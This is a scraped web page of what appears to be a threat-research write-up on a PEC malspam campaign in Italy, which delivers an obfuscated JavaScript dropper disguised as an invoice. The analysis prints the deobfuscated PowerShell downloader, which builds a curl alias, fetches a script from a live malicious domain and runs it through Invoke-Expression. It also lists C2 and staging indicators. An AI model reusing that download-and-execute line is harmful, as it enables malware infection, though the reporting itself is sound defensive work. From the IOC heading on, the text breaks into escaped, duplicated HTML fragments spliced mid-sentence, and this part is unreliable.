flex-col-reverse md:flex-row md:items-start md:gap-lg xl:gap-xl mx-auto max-w-screen-lg"><div class="wysiwyg table max-w-full wysiwyg-h2:text-h2 wysiwyg-h2:text-navy wysiwyg-h3:text-h3 wysiwyg-h3:text-black wysiwyg-h4:text-h4 wysiwyg-h4:text-grey wysiwyg-h5:text-h5 wysiwyg-h5:text-grey wysiwyg-h6:text-h6 wysiwyg-h6:text-grey wysiwyg-p:text-body-3 wysiwyg-p:text-grey wysiwyg-a:text-veridian wysiwyg-table:w-auto wysiwyg-td:border-1 wysiwyg-td:border-solid wysiwyg-td:border-brumosa wysiwyg-td:p-sm wysiwyg-td:text-center wysiwyg-hr:border-t-4 wysiwyg-hr:border-grey wysiwyg-ul:list-none wysiwyg-ul:pl-3 wysiwyg-li:before:relative wysiwyg-li:before:top-[15px] wysiwyg-li:before:left-[-15px] wysiwyg-li:before:block wysiwyg-li:before:w-[3px] wysiwyg-li:before:h-[3px] wysiwyg-ul:text-grey wysiwyg-li:before:bg-black wysiwyg-ol:text-grey relative z-[1] w-full"><p class=""><span lang="EN-GB">In early October, the X-Labs research team identified a malspam campaign targeting Italian businesses and individuals through PEC (Posta Elettronica Certificata). PEC is a certified email system commonly used in Italy for secure, legally recognized communication. It is widely adopted by individuals, businesses and public administrations—especially in cases where proof of communication is needed. Due to its trusted nature, PEC is often exploited by cybercriminals for malicious purposes. <o:p></o:p></span></p><p class=""><span lang="EN-GB">Our team observed multiple similar malspam emails targeting various entities through their cloud telemetry. Fig. 1 illustrates an example of an email using PEC to distribute malicious code.</span><span Times="" New="" lang="EN-GB"> <o:p></o:p></span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%201%20-%20malspam-email.png" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 1 </strong>- Malspam email</em></p><p class=""><span lang="EN-GB">The email was intended for an Italian customer. The body of the email has been translated into English as follows:</span><em><span lang="EN-GB"><o:p></o:p></span></em></p><blockquote><p class=""><em><span style="color:red;font-size:10.0pt;line-height:107%" lang="EN-GB">I would like to hereby draw your attention to the fact that, by virtue of the contract signed between us on 1/06/2024, you are obliged to pay me the sum of 1254 euros. To date, this sum remains unpaid despite various reminders which I have already sent.<o:p></o:p></span></em></p><p class=""><em><span style="color:red;font-size:10.0pt" lang="EN-GB">I therefore inform you that, if you do not spontaneously make the payment within five days of receiving this letter, I will be forced to instruct my lawyer to start the legal procedures for the recovery of the credit, without further notices or reminders. This communication therefore constitutes a formal notice and interrupts the running of the statute of limitations.<o:p></o:p></span></em></p><p class=""><em><span style="color:red;font-size:10.0pt" lang="EN-GB">Best regards,<o:p></o:p></span></em></p><p class=""><em><span style="color:red" lang="EN-GB">The invoice is available via the following link: <malicious></malicious></span></em></p></blockquote><p class=""><span lang="EN-GB">The company name and its address have been intentionally redacted to protect their information. The threat actor disguises the actual URL by using the company name as the link text. In the email above, we identified a malicious link, namely: <o:p></o:p></span></p><ul><li><em><span style="color:black" Aptos="" lang="EN-GB">hxxps://nk916b6wt4xq0kq92uq9a5b8xdk19cqbizqfbty7sw1jehqee3ds[.]customerconverse[.]com/aoc9h3</span></em><span style="color:black" Aptos="" lang="EN-GB"><o:p></o:p></span></li></ul><p class=""><span style="color:black" Aptos="" lang="EN-GB">The subdomain appears to be DGA-generated and looks random. There is minimal information on the domain, so likely to be controlled by an attacker. At the time of analysis, the URL was active and downloaded a malicious JavaScript file. (</span><em><span style="color:red" Aptos="" lang="EN-GB">_Fattura_38377668.js</span></em><span style="color:black" Aptos="" lang="EN-GB">). <o:p></o:p></span></p><p class=""><span style="color:black" Aptos="" lang="EN-GB">Let&#x27;s take a closer look at the structure of the script and analyze its behaviour.<o:p></o:p></span></p><h2><span lang="EN-GB">JavaScript Analysis</span></h2><p class=""><span lang="EN-GB">Upon initial inspection, the script appears heavily obfuscated, making it challenging to discern its true functionality. To better understand its operations, we undertook the process of de-obfuscation. <o:p></o:p></span></p><p class=""><span lang="EN-GB">There are 3 functions in the script.<o:p></o:p></span></p><ul><li><em><span lang="EN-GB">honour_march_0thehas()<o:p></o:p></span></em></li><li><em><span lang="EN-GB">honour_march_0wasbut(thehas, wasbut)<o:p></o:p></span></em></li><li><em><span lang="EN-GB">hvngqasq(</span></em><span lang="EN-GB">zfutxpog</span><em><span lang="EN-GB">)<o:p></o:p></span></em></li></ul><p class=""><span lang="EN-GB">Let’s breakdown each function to understand:<o:p></o:p></span></p><h3><span lang="EN-GB"><strong>function honour_march_0thehas()</strong><o:p></o:p></span></h3><p class=""><span lang="EN-GB">Inside the function, a variable <strong>overchurch </strong>is declared, which is an array containing four strings. The strings in the <strong>overchurch </strong>array appear to be obfuscated or encoded data. Without further context, it is difficult to determine their exact purpose, but they may represent encrypted or encoded information that could be used elsewhere in the code. Figure 2 shows its code snippet.</span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%202%20-%20codechurch%20code%20snippet.png" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 2</strong> - Overchurch code snippet</em></p><h3><span lang="EN-GB"><strong>function honour_march_0wasbut(thehas, wasbut)</strong><o:p></o:p></span></h3><p class=""><span lang="EN-GB">The function takes two parameters:<o:p></o:p></span></p><ul><li><span lang="EN-GB"><strong>thehas </strong>- </span><em><span style="letter-spacing:.25pt" lang="EN-GB">object or array that holds encoded data</span></em></li><li><span lang="EN-GB"><strong>wasbut </strong>- </span><em><span lang="EN-GB">likely serves as a key or additional parameter for decoding.</span></em></li><li><span lang="EN-GB">It calls the previously defined function <strong>honour_march_0thehas() </strong>to retrieve an array of strings (stored in<strong> viiheld)</strong>.</span></li><li><span lang="EN-GB">The outer function <strong>honour_march_0wasbut</strong> is re-assigned to an inner function that performs a specific operation.</span></li><li><span lang="EN-GB">The first input parameter <strong>fromhabit</strong> is adjusted by subtracting 301 (</span><em><span lang="EN-GB">0x12D</span></em><span lang="EN-GB">). This value is then used to index into the <strong>viiheld </strong>array.</span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%203%20-%20deciphering-the-function.png" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 3</strong> - <span lang="EN-GB">Deciphering the function</span></em></p><p class=""><span lang="EN-GB">If honour_march_0wasbut[&#x27;AiPGsL&#x27;] is not defined, it initializes several functions and variables.<o:p></o:p></span></p><p class=""><span lang="EN-GB">A<strong> custom base64 decoding method</strong> (</span><em><span lang="EN-GB">shown in Fig. 4):</span></em><span lang="EN-GB"><o:p></o:p></span></p><ul><li><span lang="EN-GB">It takes an input parameter called <strong>Wallsmisleading</strong>, which is expected to be a Base64-encoded string.<o:p></o:p></span></li><li><span lang="EN-GB">It uses <strong>bitwise </strong>operations and modular arithmetic to convert each Base64 character into its corresponding binary value.<o:p></o:p></span></li><li><span lang="EN-GB">The decoded binary values are then converted back to characters using <strong>String.fromCharCode.</strong><o:p></o:p></span></li><li><span lang="EN-GB">After decoding, the function constructs a URL-encoded string. Each character value is converted to a percent-encoded format.<o:p></o:p></span></li><li><span lang="EN-GB">Finally, the function returns the fully URL-decoded string.<o:p></o:p></span></li><li><span lang="EN-GB">Bitwise operation adds a layer of complexity, which could be an attempt to disguise the decoding logic.</span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%204%20-%20custom-base4-decoding-method.png" class="mt-0 h-auto w-full"/></p><p class=" text-center wysiwyg-body-3"><em><strong>Fig. 4</strong> -<span lang="EN-GB">Custom base4 decoding method</span></em></p><p class=""><span lang="EN-GB"><strong>Cipher-like decoding using XOR operations </strong>(</span><em><span lang="EN-GB">shown in Fig. 5</span></em><span lang="EN-GB">)<strong>:</strong></span></p><ul><li><span lang="EN-GB">It uses a key (derived from the <strong>wAllsmisleading</strong> input) to decode the input string (<strong>vIiheld</strong>) by XORing characters.</span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%205%20-%20xor-operations.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 5 </strong>- XOR operations</em></p><ul><li><span lang="EN-GB">The function (Fig. 6) attempts to retrieve a previously computed result from the thehas parameter (which is likely an array or object) using the adjusted fromhabit index and ownchurch.<o:p></o:p></span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%206%20-%20retrieving-function.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 6</strong> - Retrieving function</em></p><p class=""><span lang="EN-GB">Finally, the function returns the decoded value.<o:p></o:p></span></p><h3><span lang="EN-GB">function hvngqasq(zfutxpog)<o:p></o:p></span></h3><ul><li><span lang="EN-GB">This function takes a hexadecimal string (<strong>zfutxpog</strong>), ensures it has an even number of characters, and converts each two-character pair into its corresponding integer value. The resulting array of numbers is then returned. Fig 7 shows its code snippet:<o:p></o:p></span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%207-%20number-array-code-snippet.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 7 </strong>- Number array code snippet</em></p><p class=""><span lang="EN-GB">Further in that, there are 3 variables that will now reference to the function <strong>honour_march_0wasbut.</strong><o:p></o:p></span></p><ul><li><span lang="EN-GB">uaxpaudedmqohlyd<o:p></o:p></span></li><li><span lang="EN-GB">ysqyhmnt<o:p></o:p></span></li><li><span lang="EN-GB">hkjtqnfwmnjzwo<o:p></o:p></span></li></ul><p class=""><span lang="EN-GB">There are 2 variables that stores the returned value of the function <strong>hvngqasq </strong>(shown in Fig. 9)<o:p></o:p></span></p><ul><li><span lang="EN-GB">aosfxhvcl<o:p></o:p></span></li><li><span lang="EN-GB">ollazxbarpu<o:p></o:p></span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%208%20-%20two-variables.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 8 </strong>- Two variables</em></p><p class=""><span lang="EN-GB">With CyberChef, the returned value of the function <strong>hvngqasq </strong>is computed. Figure 9 shows CyberChef recipe</span><span style="font-style:normal;font-weight:normal" lang="EN-GB"><o:p></o:p></span>:</p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%209%20-%20cyberchef-recipe.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 9</strong> - CyberChef recipe</em></p><p class=""><span style="letter-spacing:.25pt" lang="EN-GB">Let&#x27;s proceed to examine the sections of the code where the returned values are being utilized. Fig. 10 shows the code where these variables are being used.<o:p></o:p></span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2010%20-%20variable-code-snippet.png" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 10 </strong>- Variable code snippet</em></p><p class=""><span lang="EN-GB">There is a XOR operation between elements of two arrays, <strong>aosfxhvcl </strong>and <strong>ollazxbarpu</strong>, and converting the result into a character using <strong>String.fromCharCode().</strong> The code is self-explanatory. To check the value stored in the variable <strong>cqlduvdo</strong>, we created the following Python code:</span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2011%20-%20python-code.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 11</strong> - Python code</em></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2012%20-%20returned-result.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 12</strong> - Returned result</em></p><p class=""><span style="letter-spacing:.25pt" lang="EN-GB">Voila! This reveals some interesting information. Though it still seems to be written in PowerShell and its looks like it is obfuscated. Let walk through key elements.<o:p></o:p></span></p><ul><li><span lang="EN-GB"><strong>new-alias press c$($qgbulzirjil)l;:</strong></span><span style="letter-spacing:.25pt" lang="EN-GB"><strong> </strong>This is creating a new alias named <strong>press</strong>, and it is creating it dynamically based on the variable <strong>$qgbulzirjil. $qgbulzirjil</strong> is defined as <strong>&#x27;ur&#x27;</strong>, so <strong>c$($qgbulzirjil)l </strong>expands to <strong>&#x27;curl&#x27;,</strong>making press an alias for curl (which is used to send HTTP requests).</span></li><li><span lang="EN-GB"><strong>$bumtcbxgwj=(7251,7253,7270</strong>... </span><span style="letter-spacing:.25pt" lang="EN-GB">defines a series of numbers, and the following loop iterates through them. Each number has <strong>7148</strong> subtracted from it, and the resulting number is converted to a character. This suggests the numbers represent obfuscated ASCII codes. We decoded this section to see what the output would be. Here is the Python code below:</span></li></ul><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2013%20-%20python-script-ascii-codes.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 13</strong> - Pytohn script (ASCII codes)</em></p><p class=""><span style="letter-spacing:.25pt" lang="EN-GB"><strong>DECODED URL:<o:p></o:p></strong></span></p><h3>gizpvovur.top/1.php?s=mints13<span style="letter-spacing:.25pt" lang="EN-GB"><strong><o:p></o:p></strong></span></h3><ul><li><span lang="EN-GB"><strong>.$([char](9992-9887)+&#x27;e&#x27;+&#x27;x&#x27;)</strong></span><span style="letter-spacing:.25pt" lang="EN-GB">: This is dynamically constructing and executing a command. The math results in 105, which is the ASCII code for &#x27;i&#x27;, so this becomes iex, a shorthand for the PowerShell Invoke-Expression command, which executes the code inside.<o:p></o:p></span></li><li><span style="letter-spacing:.25pt" lang="EN-GB">The script downloads or interacts with the URL <strong>gizpvovur[.]top/1.php?s=mints13 </strong>using <strong>curl</strong>. This behaviour could be part of a script to retrieve further payloads or instructions from a remote server, and it has potential malicious intent.<o:p></o:p></span></li></ul><p class=""><span lang="EN-GB">Let&#x27;s move on to the next step. Fig. 14 shows the follow-up code snippet:</span></p><p class=""> </p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2014%20-%20follow-up-code-snippet.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 14</strong> - Folllow-up code snippet</em></p><p class=""><span style="letter-spacing:.25pt" lang="EN-GB">Again, an array is being created and assigned to variable <strong>nkgkunojefmjc</strong>. As mentioned previously, variables, <strong>uaxpaudedmqohlyd</strong>, <strong>ysqyhmnt </strong>and <strong>hkjtqnfwmnjzwo </strong>are referenced to a function <strong>honour_march_0wasbut</strong>, causing to initialize several functions and variable if the certain condition (mentioned above) is not met. It is very time consuming to manually decode the function, but we can debug that JavaScript code to get to know the output which are later assigned to above variables. After debugging, we get to know the strings assigned to these variables.</span><span style="font-style:normal;font-weight:normal;letter-spacing:.25pt" lang="EN-GB"><o:p></o:p></span></p><p class=""><span style="font-size:9.0pt;line-height:107%" lang="EN-GB"><strong>uaxpaudedmqohlyd </strong>-&gt; “winmgmts:root\cimv2:Win32_Process”</span><span style="font-size:9.0pt;font-style:normal;font-weight:normal;line-height:107%" lang="EN-GB"><o:p></o:p></span></p><p class=""><span style="font-size:9.0pt;line-height:107%" lang="EN-GB"><strong>ysqyhmnt</strong> -&gt; “less powershel”</span><span style="font-size:9.0pt;font-weight:normal;line-height:107%" lang="EN-GB"><o:p></o:p></span></p><p class=""><span style="font-size:9.0pt;line-height:107%" lang="EN-GB"><strong>hkjtqnfwmnjzwo </strong>-&gt; “conhost –head”</span><span style="font-size:9.0pt;font-weight:normal;line-height:107%" lang="EN-GB"><o:p></o:p></span></p><p class=""><span style="font-size:9.0pt;line-height:107%" lang="EN-GB">cqlduvdo -&gt; “l $qgbulzirjil=&#x27;ur&#x27;;new-alias press c$($qgbulzirjil)l;$bumtcbxgwj=(7251,7253,7270,7260,7266,7259,7266,7265,7262,7194,7264,7259,7260,7195,7197,7194,7260,7252,7260,7211,7263,7209,7257,7253,7258,7264,7263,7197,7199);$oayiop=(&#x27;bronx&#x27;,&#x27;get-cmdlet&#x27;);$axvdkllmwtkm=$bumtcbxgwj;foreach($jtnsbmkhwu in $axvdkllmwtkm){$zsbvmyotsckki=$jtnsbmkhwu;$ynfictsxc=$ynfictsxc+[char]($zsbvmyotsckki-7148);$keskaghbwwme=$ynfictsxc;$peonhdgp=$keskaghbwwme};$fkzszio[2]=$peonhdgp;$ulhsdxick=&#x27;rl&#x27;;$ervchdsip=1;.$([char](9992-9887)+&#x27;e&#x27;+&#x27;x&#x27;)(press -useb $peonhdgp)”</span><span style="font-size:9.0pt;font-weight:normal;line-height:107%" lang="EN-GB"><o:p></o:p></span></p><p class=""><span style="font-size:9.0pt;line-height:107%" lang="EN-GB"><strong>hkjtqnfwmnjzwo</strong> -&gt; “time”</span><span style="font-size:9.0pt;font-weight:normal;line-height:107%" lang="EN-GB"><o:p></o:p></span></p><h3><span lang="EN-GB">winmgmts:root\cimv2:Win32_Process:</span><span style="font-style:normal" lang="EN-GB"><o:p></o:p></span></h3><ul><li><span style="letter-spacing:.25pt" lang="EN-GB">This part of the code is using <strong>WMI</strong> (Windows Management Instrumentation) to access information about the system.<o:p></o:p></span></li><li><span lang="EN-GB">winmgmts: WMI moniker that tells the Windows Script Host to use the WMI objects, connects to the default namespace</span><span style="font-style:normal;font-weight:normal" lang="EN-GB"><o:p></o:p></span></li><li><span style="letter-spacing:.25pt" lang="EN-GB"><strong>root\cimv2</strong> is the default namespace in WMI that contains many classes related to system management.<o:p></o:p></span></li><li><span style="letter-spacing:.25pt" lang="EN-GB"><strong>Win32_Process</strong> is a WMI class that provides information about processes running on the system. This allows the script to interact with processes on the machine. Such type of activity can be risky as a script using this can potentially be used for malicious activities, such as terminating security-related processes or starting unwanted processes.<o:p></o:p></span></li></ul><p class=""><span lang="EN-GB"><strong>Headless console host environment:</strong></span><span style="font-style:normal;font-weight:normal" lang="EN-GB"><o:p></o:p></span></p><ul><li><span style="letter-spacing:.25pt" lang="EN-GB">The command starts <strong>conhost (Console Window Host) in headless mode</strong>, meaning it runs without displaying a console window. This is often used to run background processes silently, and it could be a tactic to hide malicious behaviour (Stealth Execution).<o:p></o:p></span></li></ul><p class=""><span lang="EN-GB">As we continued our investigation, we discovered another intriguing tactic. A significant number of commented lines were found, with actual active code hidden between them. This technique appears to be used to introduce junk data into memory, potentially aiming to corrupt it or obscure the malicious code. Figure 15 illustrates an example of this behaviour.<o:p></o:p></span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2015%20-%20obscuring-malicious-code.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 15</strong> - Obscring malicious code</em></p><p class=""><span lang="EN-GB">We filtered out the uncommented line</span><span style="letter-spacing:.25pt" lang="EN-GB">, much like finding a needle in a haystack and that shows as follows (see Fig. 16):</span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2016%20-%20uncommented-line.jpg" class="mt-0 h-auto w-full"/></p><p class=" text-center"><em><strong>Fig. 16</strong> - Uncommented line</em></p><p class=""><span style="letter-spacing:.25pt" lang="EN-GB">This line of code is just to re-arrange PowerShell code as follows (Fig. 17):</span><span style="font-style:normal;font-weight:normal" lang="EN-GB"><o:p></o:p></span></p><p class=" text-center"><img 17 </strong> - PowerShell code</em></p><p class=""><span lang="EN-GB">We also captured the network traffic while communicating to server i.e <strong>gizpvovur[.]top</strong><o:p></o:p></span></p><p class=""><span lang="EN-GB">As a response we are getting an obfuscated PowerShell code i.e. sha1: </span><em><span style="letter-spacing:.25pt" lang="EN-GB">d70b9c14c4146ade02c79eaf8aa335f1c50d4636 </span></em><span style="letter-spacing:.25pt" lang="EN-GB">while making connection to a staging URL i.e <strong>hxxp://gizpvovur[.]top/1.php?s=mints13.</strong></span><span as illustrated in Fig. 19:</span></p><p class=" text-center"><img src="https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2019%20-%20network-traffic.jpg" class="mt-0 h-auto script <strong>uvj0epxg28htr.php</strong> (php appears to be different with each request) from potential C2 server i.e. <strong>fjjlkfakeinfkid[.]top</strong> and passing three parameters (id, key, machine<o:p></o:p></span></li><li><span lang="EN-GB"><strong>key</strong></span><span style="letter-spacing:.25pt" lang="EN-GB"> - might be an authentication token to authorize the request</span><em><span style="letter-spacing:.25pt" lang="EN-GB"><strong><o:p></o:p></strong></span></em></li><li><span style="letter-spacing:.25pt" lang="EN-GB"><strong>s</strong> – might be <strong>time </strong>query in minutes potentially for sleep operation.</span> </li></ul><h2><span lang="EN-GB">Conclusion</span><span style="font-style:normal;font-weight:normal" lang="EN-GB"><o:p></o:p></span></h2><p class=""><span lang="EN-GB">The increasing use of PEC (Posta Elettronica Certificata) for delivering unsolicited emails with embedded malicious and obfuscated JavaScript code represents a growing threat to cybersecurity. These emails leverage the secure nature of PEC to gain trust, allowing them to bypass certain security filters. The obfuscation of JavaScript code makes it difficult to detect and analyze the malicious payload, increasing the risk of infection for users.<o:p></o:p></span></p><h2><span lang="EN-GB">Protection statement <o:p></o:p></span></h2><p class=""><span lang="EN-GB">Forcepoint customers are protected against this threat at the following stages of attack:<o:p></o:p></span></p><ul><li><span lang="EN-GB">Stage 2 (Lure) – Malicious URLs associated with this attack are identified and blocked.<o:p></o:p></span></li><li><span lang="EN-GB">Stage 5 (dropper) – The dropper file is added to Forcepoint malicious database and are blocked.<o:p></o:p></span></li><li><span lang="EN-GB">Stage 6 (Call Home) – Blocked C&amp;C domain.<o:p></o:p></span></li></ul><h2><span lang="EN-GB">IOC:<o:p></o:p></span></h2><p class=""><span lang="EN-GB"><strong>Dropper URLs:<o:p></o:p></strong></span></p><ul><li><span lang=\"EN-GB\"\u003eIn early October, the X-Labs research team identified a malspam campaign targeting Italian businesses and individuals through PEC (Posta Elettronica Certificata). PEC is a certified email system commonly used in Italy for secure, legally recognized communication. It is widely adopted by individuals, businesses and public administrations—especially in cases where proof of communication is needed. Due to its trusted nature, PEC is often exploited by cybercriminals for malicious purposes.\u0026nbsp;\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan lang=\"EN-GB\"\u003eOur team observed multiple similar malspam emails targeting various entities through their cloud telemetry. Fig. 1 illustrates an example of an email using PEC to distribute malicious code.\u003c/span\u003e\u003cspan style=\"font-family:\u0026quot;Times New Roman\u0026quot;,serif;font-size:16.0pt;line-height:107%;\" lang=\"EN-GB\"\u003e\u0026nbsp;\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003cp class=\"text-align-center\"\u003e\u003cimg src=\"https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%201%20-%20malspam-email.png\"\u003e\u003c/p\u003e\u003cp class=\"text-align-center\"\u003e\u003cem\u003e\u003cstrong\u003eFig. 1 \u003c/strong\u003e- Malspam email\u003c/em\u003e\u003c/p\u003e\u003cp\u003e\u003cspan lang=\"EN-GB\"\u003eThe email was intended for an Italian customer. To date, this sum remains unpaid despite various reminders which I have already sent.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/em\u003e\u003c/p\u003e\u003cp style=\"line-height:normal;\"\u003e\u003cem\u003e\u003cspan style=\"color:red;font-size:10.0pt;\" lang=\"EN-GB\"\u003eI therefore inform you that, if you do not spontaneously make the payment within five days of receiving this letter, I will be forced to instruct my lawyer to start the legal procedures for the recovery of the credit, without further notices or reminders. “time”\u003c/span\u003e\u003cspan style=\"font-size:9.0pt;font-weight:normal;line-height:107%;\" lang=\"EN-GB\"\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003ch3\u003e\u003cspan lang=\"EN-GB\"\u003ewinmgmts:root\\cimv2:Win32_Process:\u003c/span\u003e\u003cspan style=\"font-style:normal;\" lang=\"EN-GB\"\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/h3\u003e\u003cul\u003e\u003cli\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003eThis part of the code is using \u003cstrong\u003eWMI\u003c/strong\u003e (Windows Management Instrumentation) to access information about the system.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan lang=\"EN-GB\"\u003ewinmgmts: WMI moniker that tells the Windows Script Host to use the WMI objects, connects to the default namespace\u003c/span\u003e\u003cspan style=\"font-style:normal;font-weight:normal;\" lang=\"EN-GB\"\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003e\u003cstrong\u003eroot\\cimv2\u003c/strong\u003e is the default namespace in WMI that contains many classes related to system management.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003e\u003cstrong\u003eWin32_Process\u003c/strong\u003e is a WMI class that provides information about processes running on the system. This allows the script to interact with processes on the machine. Such type of activity can be risky as a script using this can potentially be used for malicious activities, such as terminating security-related processes or starting unwanted processes.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cspan lang=\"EN-GB\"\u003e\u003cstrong\u003eHeadless console host environment:\u003c/strong\u003e\u003c/span\u003e\u003cspan style=\"font-style:normal;font-weight:normal;\" lang=\"EN-GB\"\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003eThe command starts \u003cstrong\u003econhost (Console Window Host) in headless mode\u003c/strong\u003e, meaning it runs without displaying a console window. October, the X-Labs research team identified a malspam campaign targeting Italian businesses and individuals through PEC (Posta Elettronica Certificata). PEC is a certified email system commonly used in Italy for secure, legally recognized communication. It is widely adopted by individuals, businesses and public administrations—especially in cases where proof of communication is needed. Due to its trusted nature, PEC is often exploited by cybercriminals for malicious purposes.\u0026nbsp;\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan lang=\"EN-GB\"\u003eOur team observed multiple similar malspam emails targeting various entities through their cloud telemetry. Fig. 1 illustrates an example of an email using PEC to distribute malicious code.\u003c/span\u003e\u003cspan style=\"font-family:\u0026quot;Times New Roman\u0026quot;,serif;font-size:16.0pt;line-height:107%;\" lang=\"EN-GB\"\u003e\u0026nbsp;\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/p\u003e\u003cp class=\"text-align-center\"\u003e\u003cimg src=\"https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%201%20-%20malspam-email.png\"\u003e\u003c/p\u003e\u003cp class=\"text-align-center\"\u003e\u003cem\u003e\u003cstrong\u003eFig. 1 \u003c/strong\u003e- Malspam email\u003c/em\u003e\u003c/p\u003e\u003cp\u003e\u003cspan lang=\"EN-GB\"\u003eThe email was intended for an Italian customer. The body of the email has been translated into English as follows:\u003c/span\u003e\u003cem\u003e\u003cspan lang=\"EN-GB\"\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/em\u003e\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003e\u003cem\u003e\u003cspan style=\"color:red;font-size:10.0pt;line-height:107%;\" lang=\"EN-GB\"\u003eI would like to hereby draw your attention to the fact that, by virtue of the contract signed between us on 1/06/2024, you are obliged to pay me the sum of 1254 euros. To date, this sum remains unpaid despite various reminders which I have already sent.\u003co:p\u003e\u003c/o:p\u003e\u003c/span\u003e\u003c/em\u003e\u003c/p\u003e\u003cp style=\"line-height:normal;\"\u003e\u003cem\u003e\u003cspan style=\"color:red;font-size:10.0pt;\" lang=\"EN-GB\"\u003eI therefore inform you that, if you do not spontaneously make the payment within five days of receiving this letter, I will be forced to instruct my lawyer to start the legal procedures for the recovery of the credit, without further notices or reminders. Each number has \u003cstrong\u003e7148\u003c/strong\u003e subtracted from it, and the resulting number is converted to a character. This suggests the numbers represent obfuscated ASCII codes. We decoded this section to see what the output would be. Here is the Python code below:\u003c/span\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp class=\"text-align-center\"\u003e\u003cimg src=\"https://live-forcepoint-drupal.pantheonsite.io/sites/default/files/2024-10/fig%2013%20-%20python-script-ascii-codes.jpg\"\u003e\u003c/p\u003e\u003cp class=\"text-align-center\"\u003e\u003cem\u003e\u003cstrong\u003eFig. 13\u003c/strong\u003e - Pytohn script (ASCII codes)\u003c/em\u003e\u003c/p\u003e\u003cp\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003e\u003cstrong\u003eDECODED URL:\u003co:p\u003e\u003c/o:p\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003ch3\u003egizpvovur.top/1.php?s=mints13\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003e\u003cstrong\u003e\u003co:p\u003e\u003c/o:p\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/h3\u003e\u003cul\u003e\u003cli\u003e\u003cspan lang=\"EN-GB\"\u003e\u003cstrong\u003e.$([char](9992-9887)+'e'+'x')\u003c/strong\u003e\u003c/span\u003e\u003cspan style=\"letter-spacing:.25pt;\" lang=\"EN-GB\"\u003e: This is dynamically constructing and executing a command. The math results in 105, which is the ASCII code for 'i', so this becomes iex, a shorthand for the PowerShell Invoke-Expression command, which executes the code 